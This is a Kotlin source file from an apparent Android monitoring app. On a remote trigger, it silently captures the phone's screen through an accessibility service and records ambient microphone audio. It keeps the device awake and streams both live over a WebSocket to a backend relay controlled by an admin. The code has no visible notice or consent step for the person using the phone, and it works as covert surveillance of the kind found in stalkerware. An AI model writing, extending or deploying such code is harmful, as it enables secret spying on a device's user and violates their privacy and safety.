package com.spapp.monitoring.screenstream

import android.Manifest
import android.accessibilityservice.AccessibilityService
import android.content.Context
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.media.AudioFormat
import android.media.AudioRecord
import android.media.MediaRecorder
import android.os.Build
import android.os.PowerManager
import android.os.SystemClock
import android.util.Log
import android.view.Display
import androidx.annotation.RequiresApi
import androidx.core.content.ContextCompat
import com.spapp.monitoring.BuildConfig
import com.spapp.monitoring.blocking.BlockAccessibilityService
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.suspendCancellableCoroutine
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.Response
import okhttp3.WebSocket
import okhttp3.WebSocketListener
import okio.ByteString.Companion.toByteString
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean
import kotlin.coroutines.resume

/**
 * Manages low-latency live screen and ambient audio streaming from the Android device
 * to the backend WebSocket relay.
 *
 * Latency & Performance Optimizations:
 * 1. AccessibilityService.takeScreenshot (API 30+) silent frame capture.
 * 2. Sequential frame scheduling via coroutine suspension (eliminates skipped ticks and race delays).
 * 3. 540p dimension + fast JPEG 55% compression (slashes encoding time and network payload to ~20KB).
 * 4. Backlog protection: drops frames if WebSocket outgoing queue builds up.
 * 5. Partial WakeLock prevents CPU/network throttling during active monitoring.
 * 6. Live ambient audio: 16kHz 16-bit PCM streaming (packet type 0x02) when RECORD_AUDIO is granted.
 */
object ScreenStreamManager {

    private const val TAG = "ScreenStreamManager"
    private const val MIN_CAPTURE_INTERVAL_MS = 340L // Compliant with Android's 333ms takeScreenshot rate limit
    private const val TARGET_MAX_DIMENSION = 540     // Fast downscale & transmission
    private const val JPEG_QUALITY = 55              // Fast compression with crisp clarity

    // Packet type indicators
    private const val PACKET_TYPE_VIDEO: Byte = 0x01
    private const val PACKET_TYPE_AUDIO: Byte = 0x02

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var streamJob: Job? = null
    private var audioJob: Job? = null
    private var activeWebSocket: WebSocket? = null
    private var wakeLock: PowerManager.WakeLock? = null
    private val isStreaming = AtomicBoolean(false)

    private val wsBaseUrl: String by lazy {
        BuildConfig.API_BASE_URL
            .replaceFirst("http://", "ws://")
            .replaceFirst("https://", "wss://")
            .trimEnd('/')
    }

    @Synchronized
    fun startStreaming(context: Context, authToken: String, deviceId: String) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
            Log.w(TAG, "Screen streaming requires Android 11+")
            return
        }

        // If a stream session is already actively running, ignore redundant start calls from concurrent triggers (FCM + HTTP polling)
        if (isStreaming.get() && activeWebSocket != null) {
            Log.d(TAG, "Screen stream session is already active — skipping redundant start call")
            return
        }

        // Stop any dead/stale session cleanly
        stopStreaming()

        isStreaming.set(true)

        // Acquire WakeLock to prevent network/CPU sleep while live streaming
        try {
            val powerManager = context.getSystemService(Context.POWER_SERVICE) as? PowerManager
            wakeLock = powerManager?.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "spapp:ScreenStreamWakeLock")?.apply {
                setReferenceCounted(false)
                acquire(15 * 60 * 1000L) // 15 minutes safety auto-release
            }
        } catch (e: Exception) {
            Log.w(TAG, "Failed to acquire WakeLock", e)
        }

        val client = OkHttpClient.Builder()
            .readTimeout(0, TimeUnit.MILLISECONDS)
            .pingInterval(10, TimeUnit.SECONDS)
            .build()

        val url = "$wsBaseUrl/ws/screen-stream?role=device&token=$authToken&deviceId=$deviceId"
        val request = Request.Builder().url(url).build()

        activeWebSocket = client.newWebSocket(request, object : WebSocketListener() {
            override fun onOpen(webSocket: WebSocket, response: Response) {
                Log.d(TAG, "Screen stream WebSocket connected")
                startCaptureLoop(context, webSocket)
                startAudioLoop(context, webSocket)
            }

            override fun onMessage(webSocket: WebSocket, text: String) {
                try {
                    val json = JSONObject(text)
                    if (json.optString("action") == "stop") {
                        Log.d(TAG, "Received stop signal from relay/admin")
                        if (activeWebSocket == webSocket) {
                            stopStreaming()
                        }
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Error parsing WS message", e)
                }
            }

            override fun onClosing(webSocket: WebSocket, code: Int, reason: String) {
                Log.d(TAG, "WebSocket closing: $code / $reason")
                if (activeWebSocket == webSocket) {
                    stopStreaming()
                }
            }

            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                Log.e(TAG, "WebSocket failure: ${t.message}, response code: ${response?.code}")
                if (activeWebSocket == webSocket) {
                    stopStreaming()
                }
            }
        })
    }

    @Synchronized
    fun stopStreaming() {
        if (!isStreaming.getAndSet(false)) {
            // Even if isStreaming flag was already false, ensure lingering sockets are cleaned up
            val ws = activeWebSocket
            activeWebSocket = null
            try {
                ws?.close(1000, "stream stopped")
            } catch (_: Exception) {}
            return
        }

        Log.d(TAG, "Stopping screen stream")
        streamJob?.cancel()
        streamJob = null

        audioJob?.cancel()
        audioJob = null

        val ws = activeWebSocket
        activeWebSocket = null
        try {
            ws?.close(1000, "stream stopped")
        } catch (_: Exception) {}

        try {
            if (wakeLock?.isHeld == true) {
                wakeLock?.release()
            }
        } catch (_: Exception) {}
        wakeLock = null
    }

    private fun startCaptureLoop(context: Context, ws: WebSocket) {
        streamJob?.cancel()
        streamJob = scope.launch(Dispatchers.Default) {
            Log.d(TAG, "Low-latency capture loop started")
            var lastCaptureStartTime = 0L

            while (isActive && isStreaming.get()) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    // Respect Android's 333ms takeScreenshot rate limit
                    val elapsed = SystemClock.uptimeMillis() - lastCaptureStartTime
                    val cooldown = MIN_CAPTURE_INTERVAL_MS - elapsed
                    if (cooldown > 0) {
                        delay(cooldown)
                    }

                    // Skip frame if socket outgoing queue is backed up (buffer bloat prevention)
                    if (ws.queueSize() > 0) {
                        delay(40L)
                        continue
                    }

                    lastCaptureStartTime = SystemClock.uptimeMillis()
                    captureFrameSequential(context, ws)
                } else {
                    break
                }
            }
            Log.d(TAG, "Capture loop ended")
        }
    }

    @RequiresApi(Build.VERSION_CODES.R)
    private suspend fun captureFrameSequential(context: Context, ws: WebSocket) {
        val service = BlockAccessibilityService.instance ?: run {
            Log.w(TAG, "BlockAccessibilityService not active")
            delay(500L)
            return
        }

        suspendCancellableCoroutine<Unit> { continuation ->
            try {
                service.takeScreenshot(
                    Display.DEFAULT_DISPLAY,
                    context.mainExecutor,
                    object : AccessibilityService.TakeScreenshotCallback {
                        override fun onSuccess(screenshotResult: AccessibilityService.ScreenshotResult) {
                            scope.launch(Dispatchers.Default) {
                                val hardwareBuffer = screenshotResult.hardwareBuffer
                                val colorSpace = screenshotResult.colorSpace
                                try {
                                    val hwBitmap = Bitmap.wrapHardwareBuffer(hardwareBuffer, colorSpace)
                                    if (hwBitmap != null) {
                                        val swBitmap = hwBitmap.copy(Bitmap.Config.ARGB_8888, false)
                                        hwBitmap.recycle()

                                        if (swBitmap != null) {
                                            val scaled = downscaleBitmap(swBitmap, TARGET_MAX_DIMENSION)
                                            val out = ByteArrayOutputStream()
                                            scaled.compress(Bitmap.CompressFormat.JPEG, JPEG_QUALITY, out)
                                            val jpegBytes = out.toByteArray()

                                            if (scaled != swBitmap) scaled.recycle()
                                            swBitmap.recycle()

                                            if (isStreaming.get() && ws.queueSize() == 0L) {
                                                // Prepend 0x01 packet type header
                                                val packet = ByteArray(1 + jpegBytes.size)
                                                packet[0] = PACKET_TYPE_VIDEO
                                                System.arraycopy(jpegBytes, 0, packet, 1, jpegBytes.size)
                                                ws.send(packet.toByteString())
                                            }
                                        }
                                    }
                                } catch (e: Exception) {
                                    Log.e(TAG, "Error encoding frame", e)
                                } finally {
                                    hardwareBuffer.close()
                                    if (continuation.isActive) continuation.resume(Unit)
                                }
                            }
                        }

                        override fun onFailure(errorCode: Int) {
                            Log.d(TAG, "takeScreenshot failure code: $errorCode")
                            if (continuation.isActive) continuation.resume(Unit)
                        }
                    }
                )
            } catch (e: Exception) {
                Log.e(TAG, "Failed to invoke takeScreenshot", e)
                if (continuation.isActive) continuation.resume(Unit)
            }
        }
    }

    private fun startAudioLoop(context: Context, ws: WebSocket) {
        audioJob?.cancel()

        val hasPermission = ContextCompat.checkSelfPermission(
            context,
            Manifest.permission.RECORD_AUDIO
        ) == PackageManager.PERMISSION_GRANTED

        if (!hasPermission) {
            Log.d(TAG, "RECORD_AUDIO permission not granted; streaming silent video only")
            return
        }

        audioJob = scope.launch(Dispatchers.IO) {
            var recorder: AudioRecord? = null
            try {
                val sampleRate = 16000
                val channelConfig = AudioFormat.CHANNEL_IN_MONO
                val audioFormat = AudioFormat.ENCODING_PCM_16BIT
                val minBufSize = AudioRecord.getMinBufferSize(sampleRate, channelConfig, audioFormat)
                val bufferSizeInBytes = maxOf(minBufSize, 3200)

                recorder = AudioRecord(
                    MediaRecorder.AudioSource.MIC,
                    sampleRate,
                    channelConfig,
                    audioFormat,
                    bufferSizeInBytes
                )

                if (recorder.state != AudioRecord.STATE_INITIALIZED) {
                    Log.w(TAG, "AudioRecord failed to initialize")
                    return@launch
                }

                recorder.startRecording()
                Log.d(TAG, "Live ambient audio streaming started (16kHz PCM)")

                // 100ms chunks: 1600 samples * 2 bytes = 3200 bytes per chunk
                val chunkSize = 1600
                val pcmBuffer = ShortArray(chunkSize)
                val bytePayload = ByteArray(1 + chunkSize * 2)
                bytePayload[0] = PACKET_TYPE_AUDIO

                while (isActive && isStreaming.get()) {
                    val readShorts = recorder.read(pcmBuffer, 0, chunkSize)
                    if (readShorts > 0 && isStreaming.get()) {
                        // Skip audio chunk if socket queue is congested to prevent lag buildup
                        if (ws.queueSize() > 24 * 1024) continue

                        var idx = 1
                        for (i in 0 until readShorts) {
                            val sample = pcmBuffer[i].toInt()
                            bytePayload[idx++] = (sample and 0xFF).toByte()
                            bytePayload[idx++] = ((sample shr 8) and 0xFF).toByte()
                        }
                        ws.send(bytePayload.toByteString(0, idx))
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Audio stream error", e)
            } finally {
                try {
                    recorder?.stop()
                    recorder?.release()
                } catch (_: Exception) {}
                Log.d(TAG, "Audio stream stopped")
            }
        }
    }

    private fun downscaleBitmap(src: Bitmap, maxDim: Int): Bitmap {
        val width = src.width
        val height = src.height
        if (width <= maxDim && height <= maxDim) return src
        val scale = maxDim.toFloat() / maxOf(width, height)
        val dstWidth = (width * scale).toInt().coerceAtLeast(1)
        val dstHeight = (height * scale).toInt().coerceAtLeast(1)
        return Bitmap.createScaledBitmap(src, dstWidth, dstHeight, true)
    }
}
